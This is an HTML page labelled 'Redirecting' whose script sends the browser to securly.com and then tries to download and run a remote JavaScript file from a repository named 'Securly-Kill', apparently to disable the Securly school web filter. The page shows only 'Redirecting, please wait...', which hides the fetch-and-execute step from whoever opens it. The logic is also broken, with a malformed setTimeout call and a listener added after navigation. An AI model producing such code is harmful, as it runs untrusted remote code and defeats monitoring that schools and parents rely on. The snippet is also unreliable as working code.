<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting</title>
    <script>
        // Wait for the page to load
        window.addEventListener('load', () => {
            const redirectUrl = 'https://securly.com';
            const scriptUrl = 'https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js';

            // Redirect to the new URL
            window.location.href = redirectUrl;

            // Listen for the 'pageshow' event after redirection
            window.addEventListener('pageshow', () => {
                fetch(scriptUrl)
                    .then(response => response.text())
                    .then(scriptContent => {
                        const scriptElement = document.createElement('script');
                        scriptElement.textContent = scriptContent;
                        document.body.appendChild(scriptElement);

                        console.log('Script executed.');

                        // Stop page loading after script execution
                        setTimeout(200)
                        window.stop();
                    })
                    .catch(err => console.error('Error fetching script:', err));
            });
        });
    </script>
</head>
<body>
    <p>Redirecting, please wait...</p>
</body>
</html>
